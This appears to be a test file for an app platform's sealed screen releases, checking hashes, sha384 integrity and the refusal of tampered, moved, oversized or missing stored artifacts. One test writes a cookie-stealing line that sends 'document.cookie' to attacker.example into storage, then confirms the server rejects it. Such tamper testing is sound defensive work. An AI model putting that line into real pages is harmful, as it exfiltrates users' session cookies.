import { toBase64 } from "@grasp-os/shared/encoding";
import { appIdSchema } from "@grasp-os/shared/ids";
import { env } from "cloudflare:workers";
import { eq } from "drizzle-orm";
import { drizzle } from "drizzle-orm/d1";
import { describe, expect, it } from "vite-plus/test";
import { z } from "zod";

import { loadRelease, sealedScreen } from "../src/app-releases.ts";
import { appCandidateReports, appCandidates } from "../src/db/core/schema.ts";
import {
  frameAccess,
  frameObjectMaxBytes,
  stageFrame,
} from "../src/screen-frame.ts";
import { release } from "./apps.ts";
import { mockIdp } from "./idp.ts";
import { frameDocument, loadFrame, pathOf, routed } from "./screen-frames.ts";
import { artifactKey, failure } from "./sealed-apps.ts";
import { signedInApi } from "./sign-in.ts";

// A screen of a published version opens from the bytes its release sealed
// (app-releases.ts, `sealedScreen`): built while the candidate is built,
// its hashes in the candidate's report, never compiled when someone opens
// it, and refused, not built, when the sealed bytes are missing.

const idp = mockIdp();

const files = {
  "schema.ts": `import { defineSchema } from "@grasp-os/sdk";

export default defineSchema({});
`,
  "app.ts": `import { app } from "@grasp-os/sdk";

import schema from "./schema.ts";

export default app({
  name: "Sealed screens",
  schema,
  access: { tables: {} },
  operations: {},
  internalOperations: {},
  screens: [],
  uses: [],
});
`,
  "screens/desk.tsx": `export default function Desk() {
  return <p>Desk</p>;
}
`,
  "screens/inbox.tsx": `export default function Inbox() {
  return <p>Inbox</p>;
}
`,
};

/** Where the screens' builds are cached in R2. */
const buildCache = "screen-builds/";

/** Deletes every cached screen build, so a build would have to start again. */
const clearBuildCache = async (): Promise<void> => {
  let cursor: string | undefined;
  do {
    // oxlint-disable-next-line no-await-in-loop -- one page after another
    const page = await env.FILES.list({ prefix: buildCache, cursor });
    // oxlint-disable-next-line no-await-in-loop -- see above
    await env.FILES.delete(page.objects.map(({ key }) => key));
    cursor = page.truncated ? page.cursor : undefined;
  } while (cursor !== undefined);
};

/** How many screen builds the cache holds. */
const cachedBuilds = async (): Promise<number> => {
  const page = await env.FILES.list({ prefix: buildCache });
  return page.objects.length;
};

/** An App running `files`, and who builds it. */
const published = async () => {
  const builder = await signedInApi(idp, "builder");
  const { id } = await builder.api.apps.create({ name: "Sealed screens" });
  await release(builder, id, files);
  return { builder, app: id, id: appIdSchema.parse(id) };
};

/** Where a build's frame manifest is staged in R2. */
const manifestKey = (artifact: string): string =>
  `screen-frames/${artifact}.json`;

/** Where a module an import map names is staged in R2. */
const moduleKeyOf = (address: string): string =>
  `screen-modules/${new URL(address).pathname.split("/").at(-1) ?? ""}`;

/** The sha384 Subresource Integrity of `served`, as a browser checks it. */
const sha384 = async (served: string | Uint8Array): Promise<string> =>
  `sha384-${toBase64(
    new Uint8Array(
      await crypto.subtle.digest(
        "SHA-384",
        typeof served === "string" ? new TextEncoder().encode(served) : served
      )
    )
  )}`;

/** `text` as the UTF-8 bytes it encodes to. */
const encoded = (text: string): number[] => [...new TextEncoder().encode(text)];

/** What core answers for `path`: its status, and how long it may be kept. */
const served = async (path: string) => {
  const response = await routed(path);
  return {
    status: response.status,
    cache: response.headers.get("cache-control"),
  };
};

describe("screens sealed with their release", { timeout: 120_000 }, () => {
  it("opens a published screen from its sealed bytes, without a build", async () => {
    const { builder, app, id } = await published();
    await clearBuildCache();

    const bundle = await builder.api.screens.open(app, "desk");
    const frame = await loadFrame(bundle);
    const sealed = await sealedScreen(env, id, 1, "desk");

    expect({
      artifact: bundle.artifact === sealed.artifact,
      entry: frame?.screen.entry,
      // What the frame loads is what was sealed, module for module.
      modules: Object.keys(frame?.modules ?? {}).toSorted(),
      // Nothing was compiled for it: the cache a build fills is still empty.
      built: await cachedBuilds(),
    }).toStrictEqual({
      artifact: true,
      entry: sealed.code.entry,
      modules: [
        ...Object.keys(sealed.code.kit),
        ...Object.keys(sealed.code.modules),
      ].toSorted(),
      built: 0,
    });
  });

  it("is reviewed by the hash it is opened with", async () => {
    const { builder, app } = await published();
    const admin = await signedInApi(idp, "admin");
    await clearBuildCache();

    const review = await admin.api.screenTrust.review(app);
    const opened = await builder.api.screens.open(app, "inbox");

    expect({
      reviewed: review.screens.find(({ screen }) => screen === "inbox")
        ?.artifact,
      built: await cachedBuilds(),
    }).toStrictEqual({ reviewed: opened.artifact, built: 0 });
  });

  it("carries every screen's hash in the candidate's report", async () => {
    const { builder, app, id } = await published();
    const bundle = await builder.api.screens.open(app, "desk");

    const db = drizzle(env.DB);
    const [candidate] = await db
      .select()
      .from(appCandidates)
      .where(eq(appCandidates.appId, id))
      .all();
    const report = await db
      .select()
      .from(appCandidateReports)
      .where(eq(appCandidateReports.candidateId, candidate?.id ?? ""))
      .get();
    const { screens } = z
      .object({
        release: z.object({
          screens: z.array(
            z.object({ screen: z.string(), artifact: z.string() })
          ),
        }),
      })
      .parse(JSON.parse(report?.report ?? "null")).release;

    const inbox = await sealedScreen(env, id, 1, "inbox");

    expect(screens).toStrictEqual([
      { screen: "desk", artifact: bundle.artifact },
      { screen: "inbox", artifact: inbox.artifact },
    ]);
  });

  it("refuses to open a screen whose sealed bytes are gone, and builds nothing", async () => {
    const { builder, app, id } = await published();
    const sealed = await loadRelease(env, id, 1);
    const entry = sealed.manifest.artifacts.find(
      ({ path }) => path === "screens/desk.json"
    );
    await env.FILES.delete(artifactKey(entry?.sha256 ?? ""));
    await clearBuildCache();

    expect({
      gone: await failure(
        async () => await builder.api.screens.open(app, "desk")
      ),
      // The other screen's bytes are intact.
      other: await failure(
        async () => await builder.api.screens.open(app, "inbox")
      ),
      built: await cachedBuilds(),
    }).toStrictEqual({
      gone: "version.artifact_corrupt",
      other: "ok",
      built: 0,
    });
  });

  it("refuses sealed bytes that were changed, and a screen the release doesn't seal", async () => {
    const { builder, app, id } = await published();
    const sealed = await loadRelease(env, id, 1);
    const entry = sealed.manifest.artifacts.find(
      ({ path }) => path === "screens/desk.json"
    );
    await env.FILES.put(
      artifactKey(entry?.sha256 ?? ""),
      JSON.stringify({ screen: "desk", changed: true })
    );

    expect({
      changed: await failure(
        async () => await builder.api.screens.open(app, "desk")
      ),
      unsealed: await failure(
        async () => await sealedScreen(env, id, 1, "elsewhere")
      ),
    }).toStrictEqual({
      changed: "version.artifact_corrupt",
      unsealed: "screen.not_sealed",
    });
  });

  it("names the sha384 of every module its frame loads, of the very bytes served", async () => {
    const { builder, app } = await published();
    const frame = await loadFrame(await builder.api.screens.open(app, "desk"));
    if (frame === null) {
      throw new Error("An opened screen has a frame");
    }

    const expected = Object.fromEntries(
      await Promise.all(
        Object.entries(frame.addresses).map(
          async ([name, address]) =>
            [address, await sha384(frame.modules[name] ?? "")] as const
        )
      )
    );
    expect(frame.integrity).toStrictEqual(expected);
  });

  it("refuses a staged module changed in R2, and stages it again from the sealed bytes at the next open", async () => {
    const { builder, app } = await published();
    const bundle = await builder.api.screens.open(app, "desk");
    const frame = await loadFrame(bundle);
    const [name, address] = Object.entries(frame?.addresses ?? {}).find(
      ([named]) => named.startsWith("app~")
    ) ?? ["", ""];
    const original = frame?.modules[name];

    // Whoever can write the bucket swaps the module's code, and keeps
    // what else core stored beside it.
    const key = moduleKeyOf(address);
    const staged = await env.FILES.head(key);
    await env.FILES.put(
      key,
      'fetch("https://attacker.example/" + document.cookie);',
      {
        customMetadata: staged?.customMetadata ?? {},
      }
    );
    const tampered = await served(pathOf(address));
    // The frame now misses a module: its document runs nothing.
    const document = await frameDocument(bundle);

    const reopened = await loadFrame(
      await builder.api.screens.open(app, "desk")
    );

    expect({
      tampered: { status: tampered.status, cache: tampered.cache },
      document: document.status,
      healed: reopened?.modules[name],
    }).toStrictEqual({
      tampered: { status: 404, cache: "no-store" },
      document: 404,
      healed: original,
    });
  });

  it("refuses a staged module whose code and name were both changed, however it is named", async () => {
    const { builder, app } = await published();
    const frame = await loadFrame(await builder.api.screens.open(app, "desk"));
    const [, address] = Object.entries(frame?.addresses ?? {}).find(([named]) =>
      named.startsWith("app~")
    ) ?? ["", ""];

    await env.FILES.put(moduleKeyOf(address), "export default 1;", {
      customMetadata: { name: "app~elsewhere" },
    });

    const { status } = await served(pathOf(address));
    expect(status).toBe(404);
  });

  it("refuses a staged module or manifest larger than core stages, unread, and stages no build that large", async () => {
    const { builder, app } = await published();
    const bundle = await builder.api.screens.open(app, "desk");
    const frame = await loadFrame(bundle);
    const [name, address] = Object.entries(frame?.addresses ?? {}).find(
      ([named]) => named.startsWith("app~")
    ) ?? ["", ""];
    const huge = new Uint8Array(frameObjectMaxBytes + 1);

    const key = moduleKeyOf(address);
    await env.FILES.put(key, huge, { customMetadata: { name } });
    const module = await served(pathOf(address));
    const moduleKept = await env.FILES.head(key);

    await builder.api.screens.open(app, "desk");
    const manifest = await env.FILES.head(manifestKey(bundle.artifact));
    await env.FILES.put(manifestKey(bundle.artifact), huge, {
      customMetadata: manifest?.customMetadata ?? {},
    });
    const document = await frameDocument(bundle);
    const manifestKept = await env.FILES.head(manifestKey(bundle.artifact));

    const staging = await failure(async () => {
      await stageFrame(env, "c".repeat(64), {
        entry: "app~huge",
        runtime: "app~huge",
        modules: { "app~huge": "x".repeat(frameObjectMaxBytes + 1) },
        kit: {},
        css: "",
      });
    });

    expect({
      module: module.status,
      moduleKept: moduleKept !== null,
      document: document.status,
      manifestKept: manifestKept !== null,
      staging,
    }).toStrictEqual({
      module: 404,
      moduleKept: false,
      document: 404,
      manifestKept: false,
      staging: "screen.build_failed",
    });
  });

  it("serves a module that starts with a byte order mark, or holds a lone surrogate, as the bytes its integrity names", async () => {
    const bom = "\uFEFFexport default 1;\n";
    const surrogate = 'export default "\uD800";\n';
    const code = {
      entry: "app~bom",
      runtime: "app~bom",
      modules: { "app~bom": bom, "app~surrogate": surrogate },
      kit: {},
      css: "",
    };
    const artifact = "b".repeat(64);
    await stageFrame(env, artifact, code);
    const frame = await loadFrame({
      artifact,
      frameToken: await frameAccess(env, artifact),
    });
    const modules = await Promise.all(
      Object.entries(frame?.addresses ?? {}).map(async ([name, address]) => {
        const response = await routed(pathOf(address));
        const bytes = new Uint8Array(await response.arrayBuffer());
        return {
          name,
          status: response.status,
          bytes: [...bytes],
          integrity: frame?.integrity[address] === (await sha384(bytes)),
        };
      })
    );

    expect(
      modules.toSorted((a, b) => a.name.localeCompare(b.name))
    ).toStrictEqual([
      { name: "app~bom", status: 200, bytes: encoded(bom), integrity: true },
      {
        name: "app~surrogate",
        status: 200,
        bytes: encoded(surrogate),
        integrity: true,
      },
    ]);
  });

  it("refuses a frame manifest changed in R2, or moved from another build, and stages it again at the next open", async () => {
    const { builder, app } = await published();
    const desk = await builder.api.screens.open(app, "desk");
    const inbox = await builder.api.screens.open(app, "inbox");
    const deskFrame = await loadFrame(desk);

    // Inbox's manifest, MAC and all, under desk's build.
    const inboxManifest = await env.FILES.get(manifestKey(inbox.artifact));
    await env.FILES.put(
      manifestKey(desk.artifact),
      (await inboxManifest?.text()) ?? "",
      { customMetadata: inboxManifest?.customMetadata ?? {} }
    );
    const moved = await frameDocument(desk);

    // Desk's own manifest, its entry pointed elsewhere, its MAC kept.
    await builder.api.screens.open(app, "desk");
    const deskManifest = await env.FILES.get(manifestKey(desk.artifact));
    const text = (await deskManifest?.text()) ?? "{}";
    await env.FILES.put(
      manifestKey(desk.artifact),
      JSON.stringify({ ...JSON.parse(text), entry: "app~elsewhere" }),
      { customMetadata: deskManifest?.customMetadata ?? {} }
    );
    const edited = await frameDocument(desk);

    const reopened = await loadFrame(
      await builder.api.screens.open(app, "desk")
    );

    expect({
      moved: {
        status: moved.status,
        cache: moved.headers.get("cache-control"),
      },
      edited: {
        status: edited.status,
        cache: edited.headers.get("cache-control"),
      },
      reopened: reopened?.screen.entry,
    }).toStrictEqual({
      moved: { status: 404, cache: "no-store" },
      edited: { status: 404, cache: "no-store" },
      reopened: deskFrame?.screen.entry,
    });
  });

  it("refuses to make a version current whose screen doesn't build", async () => {
    const { builder, app, id } = await published();
    const { version } = await builder.api.apps.files.commit(
      app,
      {
        "screens/broken.tsx":
          'import leftPad from "left-pad";\nexport default () => leftPad;\n',
      },
      "Broken"
    );

    const refused = await failure(
      async () => await builder.api.apps.versions.setCurrent(app, version)
    );
    const candidates = await drizzle(env.DB)
      .select()
      .from(appCandidates)
      .where(eq(appCandidates.appId, id))
      .all();

    const { currentVersion } = await builder.api.apps.get(app);

    expect({
      refused,
      current: currentVersion,
      outcome: candidates.find((row) => row.version === version)?.state,
    }).toStrictEqual({
      refused: "screen.build_failed",
      current: 1,
      outcome: "repairable_failed",
    });
  });
});
